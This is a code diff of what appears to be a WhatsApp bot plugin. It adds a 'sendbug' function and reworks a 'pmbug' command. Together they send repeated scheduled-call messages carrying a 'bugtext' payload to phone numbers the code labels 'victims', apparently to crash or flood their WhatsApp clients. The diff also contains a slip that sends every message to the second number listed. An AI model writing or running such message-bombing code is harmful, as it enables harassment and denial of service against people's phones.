@@ -1,5 +1,5 @@
 const { zokou } = require('../framework/zokou');
-const { delay, loading, react } = require("../bdd/utils")
+const { delay, loading, react } = require("../bdd/utils");
 const moment = require('moment-timezone');
 const conf = require('../set.js');
 const fs = require('fs');
@@ -12,7 +12,7 @@ const { bugtext2 } = require('../framework/bugs/bugtext2');
 const { bugtext3 } = require('../framework/bugs/bugtext3');
 const { bugtext4 } = require('../framework/bugs/bugtext4');
 const { bugtext5 } = require('../framework/bugs/bugtext5');
-const { bugpdf } = require('../framework/bugs/bugpdf.js')
+const { bugpdf } = require('../framework/bugs/bugpdf.js');
 
 
 const category = 'dev';
@@ -41,6 +41,40 @@ const timewisher = (time) => {
     return `Good Morning 🌄`;
   } 
 };
+
+async function sendbug(dest, zk, repondre, amount, victims){
+    const bug = `${bugtext1}`;
+    const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
+    for (let i = 0; i < victims.length; i++){
+      if (!phoneRegex.test(victims[i])){
+        repondre(`${victims[i]} not a valid phone number`);
+        continue;
+      } else {
+        const victim = victims[1] + '@s.whatsapp.net';
+        for (let j = 0; j < amount; j++){
+          var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+            "scheduledCallCreationMessage": {
+              "callType": "2",
+              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+              "title": bug,
+            }
+        }), { userJid: dest, quoted : ms});
+          try {
+            zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+          } catch (e) {
+            repondre(`An error occured while sending bugs to ${victims[i]}`);
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            break;
+          }
+          await delay(3000);
+        }
+        if (victims.length > 1)
+          repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
+        await delay(5000);
+      }
+    }
+    repondre(`Successfully sent ${amount} bugs to ${victims.join(', ')}.`);
+  }
 
 // --cmds--
 
@@ -94,6 +128,9 @@ docugcbug <grouplink>${mono}`;
       image: menuImage,
       caption: menu,
       contextInfo: {
+        mentionedJid:[ms.key.remoteJid],
+        forwardingScore: 9999999,
+        isForwarded: true, 
         externalAdReply:
           {
             showAdAttribution: true,
@@ -228,41 +265,41 @@ zokou(
     if (!arg[0])
       return await repondre(`Use ${prefixe}pmbug amount\n> Example ${prefixe}pmbug 30|${conf.NUMERO_OWNER} or ${prefixe}pmbug ${conf.NUMERO_OWNER}`);
     await loading(dest, zk);
-    if (!arg.join('').includes("|")){
-      const amount = 30;
-      const victims = [arg[0]];
-    } else{
-      const text = arg.join('');
-      if (text.includes('|')){
-      const amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
-        return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
-      const victims = text.split('|').map(x => x.trim())[1].split(',').map(x => x.trim());
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, repondre, amount, victims);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
+      }
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
-        return await repondre('invalid formart');
-      }
-      if (victims.length === 0)
-        return await repondre('`No victims specified`');
-    }
-    await repondre(`sending ${amount} bugs to ${victims.join(', ')}`)
-    for (let i = 0; i < victims.length; i++){
-      const victim = victims[i]+'@s.whatsapp.net';
-      for (let j = 0; j < amount; j++){
-        const bug = `${bugtext1}`;
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-          "scheduledCallCreationMessage":{
-            "callType":"2",
-            "scheduledTimestampMs":`${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
-            "title": bug
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, repondre, amount, victims);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
           }
-        }), {userJid: dest, quoted: ms});
-        zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        await delay(3000);
+        } else {
+          return await repondre('No victims specfied');
+        }
       }
-      await repondre(`*Successfully sent as many Bugs as ${amount} To ${victim}*`);
-      await delay(5000);
     }
-    await repondre(`*Successfully sent as many Bugs as ${amount} To ${victims.join(', ')} Please pause for 5 minutes*`);
     await react(dest, zk, ms, '✅');
   }
   );
+  
+  
